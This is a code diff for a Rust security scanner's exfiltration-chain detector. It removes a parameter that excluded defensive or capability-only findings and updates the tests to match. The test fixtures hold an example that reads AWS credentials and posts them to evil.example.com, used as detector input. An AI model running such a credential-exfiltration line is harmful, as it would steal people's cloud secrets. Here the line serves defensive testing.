@@ -1,4 +1,4 @@
-use std::collections::{HashMap, HashSet};
+use std::collections::HashMap;
 use std::sync::OnceLock;
 
 use regex::Regex;
@@ -175,9 +175,6 @@ pub(crate) fn detect_malicious_activity_chains(findings: &mut Vec<Finding>) {
 /// # Parameters
 /// - `findings` — scan results to inspect and mutate in place.
 /// - `text_files` — raw file content map used for network sink matching.
-/// - `non_actionable` — indices classified as defensive references or
-///   capability-only observations; they are not evidence of action and must
-///   not become chain sources or participants.
 ///
 /// # Note
 /// requires that `scan_sensitive_patterns` and `scan_entropy` have already run so that
@@ -185,7 +182,6 @@ pub(crate) fn detect_malicious_activity_chains(findings: &mut Vec<Finding>) {
 pub(crate) fn detect_exfiltration_chains(
     findings: &mut Vec<Finding>,
     text_files: &HashMap<String, String>,
-    non_actionable: &HashSet<usize>,
 ) {
     // first pass: index existing findings by file for files that have a credential source.
     let mut sources_by_file: HashMap<String, Vec<usize>> = HashMap::new();
@@ -206,15 +202,6 @@ pub(crate) fn detect_exfiltration_chains(
             sources_by_file.entry(fp.to_string()).or_default().push(idx);
         }
     }
-
-    // A defensive reference or import/fixed-argv observation is still a
-    // credential-source *label*, but not evidence that anything was read. Only
-    // the classified contexts are dropped; a finding that is Low for another
-    // reason keeps its existing chain behaviour.
-    for indices in sources_by_file.values_mut() {
-        indices.retain(|idx| !non_actionable.contains(idx));
-    }
-    sources_by_file.retain(|_, indices| !indices.is_empty());
 
     // second pass: for each candidate file, check raw content for a network sink.
     let sinks = get_network_sink_regexes();
@@ -251,7 +238,6 @@ pub(crate) fn detect_exfiltration_chains(
             .enumerate()
             .filter(|(i, f)| {
                 !source_indices.contains(i)
-                    && !non_actionable.contains(i)
                     && f.chain_id.is_none()
                     && extract_filepath_from_detail(&f.detail)
                         .map(|p| p == file_path.as_str())
@@ -316,7 +302,7 @@ mod tests {
             "cat ~/.aws/credentials\nrequests.post('https://evil.example.com', data=secret)";
         let tf = files(&[("scripts/steal.sh", content)]);
         let mut findings = scan_sensitive_patterns(&tf).findings;
-        detect_exfiltration_chains(&mut findings, &tf, &HashSet::new());
+        detect_exfiltration_chains(&mut findings, &tf);
 
         assert!(
             findings
@@ -337,7 +323,7 @@ mod tests {
         let content = "cat ~/.aws/credentials";
         let tf = files(&[("scripts/read.sh", content)]);
         let mut findings = scan_sensitive_patterns(&tf).findings;
-        detect_exfiltration_chains(&mut findings, &tf, &HashSet::new());
+        detect_exfiltration_chains(&mut findings, &tf);
 
         assert!(
             !findings
